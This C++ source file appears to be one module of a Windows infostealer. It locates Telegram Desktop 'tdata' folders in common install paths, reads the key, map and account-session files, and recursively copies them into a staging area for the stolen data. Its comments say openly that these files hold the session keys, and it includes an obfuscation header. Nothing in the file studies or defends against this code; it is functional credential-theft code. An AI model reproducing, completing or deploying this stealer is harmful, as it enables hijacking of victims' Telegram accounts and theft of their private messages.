// Telegram Desktop session (tdata) collection.
#include "../modules.h"
#include "../config.h"
#include "../core/obf.h"
#include "../core/sys.h"

namespace {

std::vector<std::string> tdata_roots() {
    std::vector<std::string> roots;
    std::string appdata = util::expand_env("%APPDATA%");
    std::string local = util::expand_env("%LOCALAPPDATA%");
    roots.push_back(util::join(appdata, "Telegram Desktop\\tdata"));
    roots.push_back(util::join(local, "Telegram Desktop\\tdata"));
    // portable installs common locations
    roots.push_back("C:\\Telegram Desktop\\tdata");
    std::string userprofile = util::expand_env("%USERPROFILE%");
    for (auto& drive : {"C:", "D:", "E:"}) {
        (void)drive;
    }
    if (!userprofile.empty())
        roots.push_back(util::join(userprofile, "Desktop\\Telegram Desktop\\tdata"));
    return roots;
}

} // namespace

namespace mod {

void telegram(const std::string& staging) {
    int found = 0;
    for (auto& root : tdata_roots()) {
        if (!util::is_dir(root)) continue;
        found++;
        std::string name = "tdata_" + std::to_string(found);
        std::string dest = util::join(staging, "telegram\\" + name);

        // key files first: key_datas holds the passcode hash binding,
        // D877F783D5D3EF8C* = account dirs, maps = index.
        for (auto& f : util::list_dir(root)) {
            std::string fn = util::to_lower(util::filename_of(f));
            if (fn == "key_datas" || fn == "maps" || fn == "configs" ||
                util::starts_with(fn, "d877f783d5d3ef8c") ||
                util::starts_with(fn, "a7fdf864fbc10b77")) {
                std::vector<uint8_t> data;
                if (util::read_file(f, data) && data.size() < cfg::MAX_GRAB_FILE)
                    stage::stage_bytes("telegram", name + "_" + util::filename_of(f), data);
            }
        }
        // full recursive copy capped (accounts subdirs carry the session keys)
        util::copy_dir_recursive(root, dest, {}, cfg::MAX_GRAB_FILE);
        stage::note("telegram", "tdata at " + root);
    }
    if (found == 0) stage::note("telegram", "no tdata found");
}

} // namespace mod
